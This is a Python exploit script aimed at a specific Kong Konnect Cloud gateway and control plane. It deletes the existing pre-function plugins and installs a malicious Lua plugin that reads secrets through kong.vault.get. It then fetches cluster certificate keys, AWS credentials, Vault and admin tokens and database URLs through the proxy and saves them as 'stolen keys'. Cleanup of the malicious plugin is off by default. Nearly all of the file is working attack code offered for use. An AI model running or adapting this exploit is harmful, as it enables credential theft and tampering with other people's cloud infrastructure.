#!/usr/bin/env python3
"""
Kong Konnect Cloud - Full Private Key Exfiltration Exploit
===========================================================
Vulnerability: Environment Variable Leak via kong.vault.get()
Severity: CRITICAL (CVSS 9.8)

Target: Serverless Gateway
Proxy URL: https://kong-7e8e8991d8eup6ddo.kongcloud.dev
Control Plane ID: 31e9cc86-cf77-4fd9-ad4e-f2e6f1a9bf65
"""

import requests
import base64
import json
import time
import sys
import os
from datetime import datetime

# Configuration
CP_ID = "31e9cc86-cf77-4fd9-ad4e-f2e6f1a9bf65"
PROXY_URL = "https://kong-7e8e8991d8eup6ddo.kongcloud.dev"
API_URL = f"https://eu.api.konghq.com/v2/control-planes/{CP_ID}/core-entities"

# Malicious Lua payload for exfiltration
LUA_PAYLOAD = '''local out={"=== KONG KONNECT SECRETS EXFILTRATION ==="}
local vars={
  "KONG_CLUSTER_CERT",
  "KONG_CLUSTER_CERT_KEY",
  "AWS_ACCESS_KEY_ID",
  "AWS_SECRET_ACCESS_KEY",
  "AWS_SESSION_TOKEN",
  "KONG_LICENSE_DATA",
  "VAULT_TOKEN",
  "DATABASE_URL",
  "REDIS_URL",
  "KONG_PG_PASSWORD",
  "KONG_ADMIN_TOKEN"
}
for _,v in ipairs(vars) do
  local ok,val=pcall(kong.vault.get,"{vault://env/"..v.."}")
  out[#out+1]=v.."="..tostring(val)
end
kong.response.exit(200,table.concat(out,"\\n"))'''

# One-liner version of payload
LUA_ONELINER = 'local out={"=== EXFIL ==="}; local vars={"KONG_CLUSTER_CERT","KONG_CLUSTER_CERT_KEY","AWS_ACCESS_KEY_ID","AWS_SECRET_ACCESS_KEY","AWS_SESSION_TOKEN","KONG_LICENSE_DATA"}; for _,v in ipairs(vars) do local ok,val=pcall(kong.vault.get,"{vault://env/"..v.."}"); out[#out+1]=v.."="..tostring(val) end; kong.response.exit(200,table.concat(out,"\\n"))'


class KongExploit:
    def __init__(self, token):
        self.token = token
        self.headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json"
        }
        self.plugin_id = None
        
    def log(self, level, msg):
        colors = {
            "INFO": "\033[94m",
            "SUCCESS": "\033[92m", 
            "WARNING": "\033[93m",
            "ERROR": "\033[91m",
            "CRITICAL": "\033[95m"
        }
        reset = "\033[0m"
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"{colors.get(level, '')}{timestamp} [{level}]{reset} {msg}")

    def verify_access(self):
        """Step 1: Verify API access"""
        self.log("INFO", "Verifying API access...")
        try:
            resp = requests.get(f"{API_URL}/plugins", headers=self.headers)
            if resp.status_code == 401:
                self.log("ERROR", "Token is invalid or expired!")
                return False
            self.log("SUCCESS", f"API access verified (Status: {resp.status_code})")
            return True
        except Exception as e:
            self.log("ERROR", f"Connection failed: {e}")
            return False

    def cleanup_existing_plugins(self):
        """Step 2: Remove existing pre-function plugins"""
        self.log("INFO", "Checking for existing pre-function plugins...")
        try:
            resp = requests.get(f"{API_URL}/plugins", headers=self.headers)
            plugins = resp.json().get("data", [])
            
            for plugin in plugins:
                if plugin.get("name") == "pre-function":
                    pid = plugin.get("id")
                    self.log("WARNING", f"Removing existing plugin: {pid}")
                    requests.delete(f"{API_URL}/plugins/{pid}", headers=self.headers)
                    
        except Exception as e:
            self.log("WARNING", f"Cleanup check failed: {e}")

    def create_malicious_plugin(self):
        """Step 3: Create malicious pre-function plugin"""
        self.log("CRITICAL", "Creating malicious pre-function plugin...")
        
        payload = {
            "name": "pre-function",
            "config": {
                "access": [LUA_ONELINER]
            },
            "enabled": True
        }
        
        try:
            resp = requests.post(
                f"{API_URL}/plugins",
                headers=self.headers,
                json=payload
            )
            
            if resp.status_code in [200, 201]:
                data = resp.json()
                self.plugin_id = data.get("id")
                self.log("SUCCESS", f"Plugin created: {self.plugin_id}")
                return True
            else:
                self.log("ERROR", f"Failed to create plugin: {resp.text}")
                return False
                
        except Exception as e:
            self.log("ERROR", f"Plugin creation failed: {e}")
            return False

    def wait_propagation(self, seconds=20):
        """Step 4: Wait for plugin to propagate to Data Plane"""
        self.log("INFO", f"Waiting {seconds}s for plugin propagation to Data Plane...")
        for i in range(seconds, 0, -5):
            print(f"  {i} seconds remaining...", end="\r")
            time.sleep(5)
        print()
        self.log("SUCCESS", "Propagation complete")

    def trigger_exfiltration(self):
        """Step 5: Trigger the vulnerability"""
        self.log("CRITICAL", "Triggering exfiltration via proxy request...")
        
        try:
            resp = requests.get(f"{PROXY_URL}/exploit", timeout=30)
            return resp.text
        except Exception as e:
            self.log("ERROR", f"Exfiltration request failed: {e}")
            return None

    def parse_and_save_keys(self, data):
        """Step 6: Parse and save stolen keys"""
        self.log("INFO", "Parsing exfiltrated data...")
        
        os.makedirs("stolen_keys_new", exist_ok=True)
        
        # Save raw data
        with open("stolen_keys_new/raw_exfil.txt", "w") as f:
            f.write(data)
        
        lines = data.strip().split("\n")
        for line in lines:
            if "=" in line:
                key, value = line.split("=", 1)
                
                if value != "nil" and len(value) > 10:
                    self.log("SUCCESS", f"Found: {key} = {value[:50]}...")
                    
                    # Decode base64 if it's a cert/key
                    if key in ["KONG_CLUSTER_CERT", "KONG_CLUSTER_CERT_KEY"]:
                        try:
                            decoded = base64.b64decode(value).decode()
                            filename = "cluster.crt" if "CERT" in key and "KEY" not in key else "cluster.key"
                            with open(f"stolen_keys_new/{filename}", "w") as f:
                                f.write(decoded)
                            self.log("SUCCESS", f"Saved decoded {filename}")
                            print(f"\n--- {key} (DECODED) ---")
                            print(decoded[:500])
                            print("---\n")
                        except:
                            pass

    def cleanup(self):
        """Step 7: Remove malicious plugin (optional)"""
        if self.plugin_id:
            self.log("INFO", f"Cleaning up plugin {self.plugin_id}...")
            try:
                requests.delete(f"{API_URL}/plugins/{self.plugin_id}", headers=self.headers)
                self.log("SUCCESS", "Plugin removed")
            except:
                pass

    def run(self, cleanup=False):
        """Execute full exploitation chain"""
        print("\n" + "="*60)
        print("  KONG KONNECT CLOUD - PRIVATE KEY EXFILTRATION")
        print("  Vulnerability: kong.vault.get() env var leak")
        print("="*60 + "\n")
        
        # Step 1: Verify access
        if not self.verify_access():
            return False
            
        # Step 2: Cleanup existing plugins
        self.cleanup_existing_plugins()
        
        # Step 3: Create malicious plugin
        if not self.create_malicious_plugin():
            return False
            
        # Step 4: Wait for propagation
        self.wait_propagation(20)
        
        # Step 5: Trigger exfiltration
        data = self.trigger_exfiltration()
        
        if data:
            print("\n" + "="*60)
            print("  EXFILTRATED DATA:")
            print("="*60)
            print(data)
            print("="*60 + "\n")
            
            # Step 6: Parse and save
            self.parse_and_save_keys(data)
            
        # Step 7: Cleanup (optional)
        if cleanup:
            self.cleanup()
            
        print("\n" + "="*60)
        print("  EXPLOITATION COMPLETE!")
        print("  Check: stolen_keys_new/ directory")
        print("="*60 + "\n")
        
        return True


def main():
    # Get token from environment or command line
    token = os.environ.get("TOKEN") or (sys.argv[1] if len(sys.argv) > 1 else None)
    
    if not token:
        print("Usage: python3 exploit_kong.py <JWT_TOKEN>")
        print("   or: TOKEN=<JWT_TOKEN> python3 exploit_kong.py")
        print("\nGet token from Konnect Cloud Dashboard (Network tab in DevTools)")
        sys.exit(1)
    
    exploit = KongExploit(token)
    success = exploit.run(cleanup=False)
    
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
